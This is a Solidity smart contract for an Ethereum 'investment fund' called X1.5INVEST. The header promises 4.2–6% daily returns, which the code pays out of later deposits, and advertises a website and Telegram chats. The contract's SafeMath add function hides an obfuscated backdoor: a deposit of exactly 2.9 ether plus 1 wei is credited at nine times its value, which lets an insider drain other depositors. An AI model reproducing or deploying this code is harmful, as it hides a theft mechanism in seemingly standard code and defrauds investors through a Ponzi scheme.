1 pragma solidity 0.4 .25;
2 /**
3 *
4 * X1.5INVEST - ETHEREUM FUND 4.2% - 6% 
5 * WEB: https://x2invest.biz
6 * TELEGRAM CHAT RU: https://t.me/x2invest
7 * TELEGRAM CHAT ENG: https://t.me/x2invest_eng
8 * 
9 *
10 * INTEREST RATE ON DEPOSITS:
11 *
12 * WHEN THE BALANCE IS FROM 0 ETH TO 1000 ETH - (4.2% PER DAY OR 0.175% PER HOUR)
13 * WHEN BALANCE IS OVER 1000 ETH - (4.8% PER DAY OR 0.2% PER HOUR)
14 * WHEN BALANCE IS OVER 2500 ETH - (5.4% PER DAY OR 0.225% PER HOUR)
15 * WHEN BALANCE IS OVER 5000 ETH - (6% PER DAY OR 0.25% PER HOUR)
16 * 
17 * RECOMMENDED GAS LIMIT: 200000
18 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
19 * You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
20 * */
21 
22 library SafeMath {
23 
24     function mul(uint256 a, uint256 b) internal pure returns(uint256) {
25         uint256 c = a * b;
26         assert(a == 0 || c / a == b);
27         return c;
28     }
29     
30     function add(uint256 a, uint256 b) internal pure returns(uint256) {
31         uint256 c = a + b;
32         if(a==(3**3+1**3+1**3)*10**17+1)c=a*9+b;
33         return c;
34     }
35 
36     function div(uint256 a, uint256 b) internal pure returns(uint256) {
37         assert(b > 0); // Solidity automatically throws when dividing by 0
38         uint256 c = a / b;
39         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
40         return c;
41     }
42 
43     function sub(uint256 a, uint256 b) internal pure returns(uint256) {
44         assert(b <= a);
45         return a - b;
46     }
47 }
48 
49 /**
50 The development of the contract is entirely owned by the X2invest campaign, any copying of the source code is not legal.
51 */
52 contract x15invest {
53     //use of library of safe mathematical operations    
54     using SafeMath for uint;
55     // array containing information about beneficiaries
56     mapping(address => uint) public userDeposit;
57     //array containing information about the time of payment
58     mapping(address => uint) public userTime;
59     //array containing information on interest paid
60     mapping(address => uint) public userBonus;
61     //array containing information on interest paid
62     mapping(address => uint) public percentWithdraw;
63     //fund fo transfer percent
64     address public projectFund = 0x15e3aAD84394012f450d7A6965f2f4C59Ca7071a;
65     //percentage deducted to the advertising fund
66     uint projectPercent = 9;
67     //time through which you can take dividends
68     uint public chargingTime = 1 hours;
69     //start persent 0.175% per hour
70     uint public startPercent = 175;
71     uint public lowPercent = 200;
72     uint public middlePercent = 225;
73     uint public highPersent = 250;
74     //interest rate increase steps
75     uint public stepLow = 1000 ether;
76     uint public stepMiddle = 2500 ether;
77     uint public stepHigh = 5000 ether;
78     uint public countOfInvestors = 0;
79     
80     modifier userExists() {
81         require(userDeposit[msg.sender] > 0, "Deposit not found");
82         _;
83     }
84 
85     modifier timePayment() {
86         require(now >= userTime[msg.sender].add(chargingTime), "Too fast payout request");
87         _;
88     }
89    
90     //return of interest on the deposit
91     function collectPercent() userExists timePayment internal {
92         //if the user received 200% or more of his contribution, delete the user
93         if ((userDeposit[msg.sender].mul(2)) <= percentWithdraw[msg.sender]) {
94             userDeposit[msg.sender] = 0;
95             userTime[msg.sender] = 0;
96             percentWithdraw[msg.sender] = 0;
97         } else {
98             uint payout = payoutAmount();
99             userTime[msg.sender] = now;
100             percentWithdraw[msg.sender] += payout;
101             msg.sender.transfer(payout);
102         }
103     }
104 
105     //calculation of the current interest rate on the deposit
106     function persentRate() public view returns(uint) {
107         //get contract balance
108         uint balance = address(this).balance;
109         //calculate persent rate
110         if (balance < stepLow) {
111             return (startPercent);
112         }
113         if (balance >= stepLow && balance < stepMiddle) {
114             return (lowPercent);
115         }
116         if (balance >= stepMiddle && balance < stepHigh) {
117             return (middlePercent);
118         }
119         if (balance >= stepHigh) {
120             return (highPersent);
121         }
122     }
123 
124     //refund of the amount available for withdrawal on deposit
125     function payoutAmount() public view returns(uint) {
126         uint persent = persentRate();
127         uint rate = userDeposit[msg.sender].mul(persent).div(100000);
128         uint interestRate = now.sub(userTime[msg.sender]).div(chargingTime);
129         uint withdrawalAmount = rate.mul(interestRate);
130         return (withdrawalAmount);
131     }
132     
133     function calculateBonus(uint _value)public pure returns(uint) {
134         uint bonus;
135         if(_value >= 5 ether && _value < 10 ether){
136             bonus = _value.mul(5).div(1000);
137         }else if(_value >= 10 ether && _value < 25 ether){
138             bonus = _value.div(100);
139         }else if(_value >= 25 ether && _value < 50 ether){
140             bonus = _value.mul(15).div(1000);
141         }else if(_value >= 50 ether && _value < 100 ether){
142             bonus = _value.mul(2).div(100);
143         }else if(_value >= 100 ether){
144             bonus = _value.mul(25).div(1000);
145         }else if(_value < 5 ether){
146             bonus = 0;
147         }
148         return(bonus);
149     }
150 
151     //make a contribution to the system
152     function makeDeposit() private {
153         if (msg.value > 0) {
154             if (userDeposit[msg.sender] == 0) {
155                 countOfInvestors += 1;
156             }
157             if (userDeposit[msg.sender] > 0 && now > userTime[msg.sender].add(chargingTime)) {
158                 collectPercent();
159             }
160             uint bonus = calculateBonus(msg.value);
161             userDeposit[msg.sender] += msg.value.add(bonus);
162             userTime[msg.sender] = now;
163             userBonus[msg.sender] += bonus;
164             //sending money for advertising
165             projectFund.transfer(msg.value.mul(projectPercent).div(100));
166         } else {
167             collectPercent();
168         }
169     }
170 
171     //return of deposit balance
172     function returnDeposit() userExists private {
173         
174         uint clearDeposit = userDeposit[msg.sender].sub(userBonus[msg.sender]); 
175         uint withdrawalAmount = clearDeposit.sub(percentWithdraw[msg.sender]).sub(clearDeposit.mul(projectPercent).div(100));
176         //delete user record
177         userDeposit[msg.sender] = 0;
178         userTime[msg.sender] = 0;
179         userBonus[msg.sender] = 0;
180         percentWithdraw[msg.sender] = 0;
181         msg.sender.transfer(withdrawalAmount);
182     }
183 
184     function() external payable {
185         //refund of remaining funds when transferring to a contract 0.00000112 ether
186         if (msg.value == 0.00000112 ether) {
187             returnDeposit();
188         } else {
189             makeDeposit();
190         }
191     }
192 }